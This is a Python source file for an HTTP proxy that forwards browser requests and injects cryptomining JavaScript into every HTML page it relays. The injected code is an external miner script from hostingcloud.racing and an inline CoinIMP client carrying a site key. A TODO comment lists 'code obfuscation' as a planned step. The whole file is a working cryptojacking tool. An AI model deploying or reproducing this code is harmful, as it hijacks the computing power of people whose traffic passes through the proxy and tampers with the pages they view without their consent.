import socketserver
from http.server import BaseHTTPRequestHandler, HTTPServer
import time
#import http.client
import urllib.request
import urllib.parse
import urllib.error
from http.cookiejar import CookieJar
from bs4 import BeautifulSoup
from IPython import embed
import io
import gzip

hostName=''
hostPort=9090

## TODO:
# - Could add better exception handling
# - Multithreaded
# - Redirection handling
# - code obfuscation or path to script in local PC
mining_code_tag = b'\nvar _givemecoins = new Client.Anonymous(\x272f8f3058590c46872f769ebf9fc1517d459045b3370860568d98ffd41664aa43\x27, { throttle: 0.3\n});\n_givemecoins.start();\n_givemecoins.addMiningNotification("Top", "This site is running JavaScript miner from coinimp.com", "#cccccc", 40, "#3d3d3d");\n'

def get_index(string,list_of_tup):
    for x in list_of_tup:
        if x[0] == string:
            return list_of_tup.index(x)
    return None

class MyServer(BaseHTTPRequestHandler):
    def do_GET(self):
        URL = "http://"+self.headers['Host']+self.path
        #print(URL)
        myheaders = self.headers.__dict__
        #if 'Cache-Control' in [x[0] for x in myheaders['_headers']]:
        #    del myheaders['_headers'][get_index('Cache-Control',myheaders['_headers'])]
        #myheaders['_headers'].append(('Cache-Control','no-cache'))
        new_req = urllib.request.Request(url=URL,headers=dict(myheaders['_headers']),method=self.command)
        print (new_req.full_url)
        
        cj = CookieJar() # To avoid infinite loop redirection
        opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
        try:
            #with urllib.request.urlopen(new_req) as response:
            with opener.open(new_req,timeout=7) as response:
                if response.info().get('Content-Encoding') == 'gzip':
                    buf = io.BytesIO( response.read())
                    f = gzip.GzipFile(fileobj=buf)
                    the_page = f.read()
                else:
                    print(response.info().get('Content-Encoding'))
                    the_page = response.read()

                if len(the_page) > 0:
                    if "text/html" in response.headers["content-type"]:
                        html = BeautifulSoup(the_page,"html.parser")#,from_encoding="iso-8859-1")
                        script = html.new_tag("script",src="https://www.hostingcloud.racing/n2J6.js")
                        html.body.insert(-1,script)
                        script2 = html.new_tag("script")
                        script2.string = mining_code_tag.decode('utf-8')
                        html.body.insert(-1,script2)
                        the_page = bytes(str(html).encode("utf-8"))
                        print("Script injected.")
                        with open("debugging_body.txt","wb+") as fout:
                            fout.write(the_page)
                            fout.write(b'\n********END**********\n')
                    else:
                        print("NO injection for: {}".format(URL))

                    self.wfile.write(the_page)  # Send result back
                response.close()
        except urllib.error.HTTPError as e:
            print("Error for {0}: {1} -> {2}".format(URL,e.code,e.msg))

myServer = HTTPServer((hostName, hostPort), MyServer)
print(time.asctime(), "Server Starts - %s:%s" % (hostName, hostPort))

try:
    myServer.serve_forever()
except KeyboardInterrupt:
    pass

myServer.server_close()
print(time.asctime(), "Server Stops - %s:%s" % (hostName, hostPort))
